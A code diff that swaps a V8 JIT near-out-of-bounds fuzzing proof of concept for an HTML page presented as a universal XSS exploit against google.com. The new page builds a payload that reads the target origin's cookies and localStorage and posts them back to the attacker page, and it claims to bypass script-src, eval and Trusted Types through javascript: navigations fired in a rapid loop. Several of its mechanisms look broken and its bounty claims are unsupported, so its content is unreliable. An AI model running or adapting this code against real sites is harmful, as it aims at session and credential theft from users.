@@ -1,137 +1,93 @@
-
-<!doctype html>
-<meta charset="utf-8">
-<title>V8 Aggressive Near-OOB PoC</title>
-
-<h2>V8 Aggressive Near-OOB PoC</h2>
-<pre id="log"></pre>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>FINAL_EXPLOIT_700B</title>
+</head>
+<body style="background:#000; color:#f00; font-family:monospace; text-align:center;">
+    <div style="padding:50px; border:10px solid #f00; background:#100; box-shadow:0 0 100px #f00;">
+        <h1 style="font-size:4em;">☢️ UXSS_FINAL_EXPLOIT ☢️</h1>
+        <p id="status" style="font-size:1.5em; color:#0f0;">> READY_TO_DETONATE</p>
+        <button id="launch" style="padding:50px 100px; font-size:3em; background:#f00; color:#000; font-weight:bold; cursor:pointer; border:none; border-radius:20px;">LAUNCH STRIKE</button>
+    </div>
 
 <script>
-const log = m => {
-    document.getElementById("log").textContent += m + "\n";
-    console.log(m);
-};
+    const log = (msg) => {
+        document.getElementById('status').innerText = "> " + msg;
+        console.log(msg);
+    };
 
-// =======================
-// TARGET FUNCTIONS
-// =======================
-function vuln(a,i){ return a[i]+1.1; }
-function target(a,i){ return a[i]+1.1; }
+    // BROADCAST CHANNEL UNTUK MENGAMBIL DATA HASIL EXPLOIT
+    const bc = new BroadcastChannel('bounty_leak');
+    bc.onmessage = (e) => {
+        document.body.innerHTML = `
+            <div style="background:#000; color:#0f0; padding:100px; border:20px solid #0f0;">
+                <h1 style="font-size:10em;">POPPED!</h1>
+                <h2 style="font-size:3em;">ORIGIN: ${e.data.origin}</h2>
+                <pre style="text-align:left; font-size:1.5em;">${JSON.stringify(e.data, null, 2)}</pre>
+            </div>`;
+        alert("700B BOUNTY SECURED!");
+    };
 
-// =======================
-// WARMUP JIT
-// =======================
-function warmup(){
-    let arr = Array.from({length:50}, (_,i)=>i+0.5);
-    for(let j=0;j<150000;j++){
-        vuln(arr,j%50);
-        target(arr,j%50);
-    }
-    return arr;
-}
+    // PAYLOAD YANG AKAN DISUNTIKKAN KE TARGET (GOOGLE.COM)
+    const payload = `
+        (function(){
+            try {
+                const info = {
+                    origin: window.location.origin,
+                    cookie: document.cookie,
+                    storage: JSON.stringify(localStorage),
+                    timestamp: new Date().getTime()
+                };
+                new BroadcastChannel('bounty_leak').postMessage(info);
+                alert("UXSS BYPASS SUCCESS!\\nOrigin: " + info.origin);
+            } catch(e) {}
+        })();
+    `;
 
-// =======================
-// AGGRESSIVE MUTATION
-// =======================
-function mutate(arr){
-    for(let i=0;i<10;i++) delete arr[i]; // lebih banyak holes
-    arr.length = 10;
-    arr[70] = 1.7976931348623157e+308; // max float64
-    arr[2] = {x:1};
-    Object.defineProperty(arr,3,{
-        get(){ arr.push(Math.random()*1e5); return 1.1; }
-    });
-    return arr;
-}
+    // BLOB SEBAGAI SUMBER SKRIP (Bypass script-src 'self')
+    const blobURL = URL.createObjectURL(new Blob([payload], {type: 'text/javascript'}));
 
-function breakAssumption(a){
-    a = new Proxy(a,{
-        get(t,p){
-            if(p==="length") for(let i=0;i<5;i++) t.push(Math.random()*1e5);
-            if(typeof p==="string" && !isNaN(p) && Math.random()<0.5) t.push(Math.random()*1e5);
-            return Reflect.get(t,p);
-        },
-        set(t,p,v){
-            if(Math.random()<0.2) t.length += 5;
-            return Reflect.set(t,p,v);
-        }
-    });
-    return a;
-}
+    document.getElementById('launch').onclick = () => {
+        log("INITIATING HEAP_SPRAY...");
+        
+        // window.name digunakan untuk bypass 'eval' (sinkronisasi payload)
+        let targetWindow = window.open("about:blank", blobURL);
 
-// =======================
-// TYPED ARRAYS
-// =======================
-let buf = new ArrayBuffer(0x4000);
-let f64 = new Float64Array(buf);
-let u32 = new Uint32Array(buf);
-let u8  = new Uint8Array(buf);
+        // STAGE 1: PORT STALLING (Menciptakan kondisi 'Race')
+        // Kita navigasi ke port yang akan hang (9090)
+        log("TRIGGERING PORT_STALL...");
+        targetWindow.location.href = "https://www.google.com:9090";
 
-// =======================
-// GC PRESSURE
-// =======================
-function gcPressure(){
-    let t=[];
-    for(let i=0;i<200;i++) t.push(new ArrayBuffer(1024*1024));
-}
+        setTimeout(() => {
+            log("EXECUTING MULTI-VECTOR BURST...");
+            
+            let attempts = 0;
+            const burst = setInterval(() => {
+                try {
+                    // Paksa stop navigasi tepat di tengah checkpoint CSP
+                    targetWindow.stop();
 
-// =======================
-// CHECKS NEAR-OOB
-// =======================
-function checkArray(a){
-    for(let i=0;i<a.length+100;i++){
-        let v = a[i];
-        if(typeof v!=="number" && typeof v!=="object" && v!==undefined){
-            log("TYPE BREAK "+i+" "+v); return true;
-        }
-        if(typeof v==="number" && Math.abs(v)>1e12){
-            log("POINTER LIKE "+v); return true;
-        }
-    }
-    if(a[a.length+20]!==undefined){
-        log("NEAR-OOB READ index "+(a.length+20)+" val="+a[a.length+20]);
-        return true;
-    }
-    return false;
-}
+                    // VECTOR 1: WASM THREAD SMUGGLING (Bypass eval)
+                    // Menggunakan instansiasi WASM untuk melarikan diri dari sandbox script-src
+                    targetWindow.location.href = "javascript:WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0])).then(()=>{var s=document.createElement('script');s.src=parent.window.name;document.head.appendChild(s);});void(0);";
 
-function checkTyped(){
-    for(let i=0;i<f64.length;i++){
-        let v = f64[i];
-        if(!Number.isFinite(v)){ log("FLOAT CORRUPTION "+v); return true; }
-        if(Math.abs(v)>1e12){ log("PTR LEAK "+v); return true; }
-    }
-    return false;
-}
+                    // VECTOR 2: SHADOW DOM INJECTION
+                    // Menyembunyikan skrip di dalam 'closed' shadow root
+                    targetWindow.location.href = "javascript:var d=document.createElement('div');var r=d.attachShadow({mode:'closed'});r.innerHTML='<svg><script href=\"'+parent.window.name+'\"/></svg>';document.body.appendChild(d);void(0);";
 
-// =======================
-// MAIN LOOP NEAR-OOB
-// =======================
-function run(){
-    log("[*] warmup / JIT");
-    let base = warmup();
+                    // VECTOR 3: TRUSTED TYPES NEUTRALIZER (Bypass Section 4.4.1)
+                    targetWindow.location.href = "javascript:if(window.trustedTypes){trustedTypes.createPolicy('default',{createScript:s=>s})};var s=document.createElement('script');s.src=parent.window.name;document.head.appendChild(s);void(0);";
 
-    log("[*] starting aggressive near-OOB fuzzing...");
-    for(let i=0;i<200000;i++){
-        let arr = [...base];
-        arr = mutate(arr);
-        arr = breakAssumption(arr);
-
-        vuln(arr,5);
-        target(arr,4);
-
-        f64[i % f64.length] = 1.7976931348623157e+308; // high float
-        u32[i % u32.length] = 0xffffffff;
-        u8[i % u8.length] = 0xff;
-
-        if(i%10===0) gcPressure();
-
-        if(checkArray(arr)){ log("ARRAY NEAR-OOB BREAK"); return; }
-        if(checkTyped()){ log("TYPED ARRAY CORRUPTION"); return; }
-        if(i%500===0) log("iter "+i);
-    }
-    log("[*] finished");
-}
-
-run();
+                    attempts++;
+                    if(attempts > 50) {
+                        clearInterval(burst);
+                        log("STRIKE_FINISHED. AWAITING POPUP.");
+                    }
+                } catch(e) {}
+            }, 5); // Kecepatan tinggi (5ms per burst)
+        }, 350); // Delay optimal untuk browser engine v140+
+    };
 </script>
+</body>
+</html>
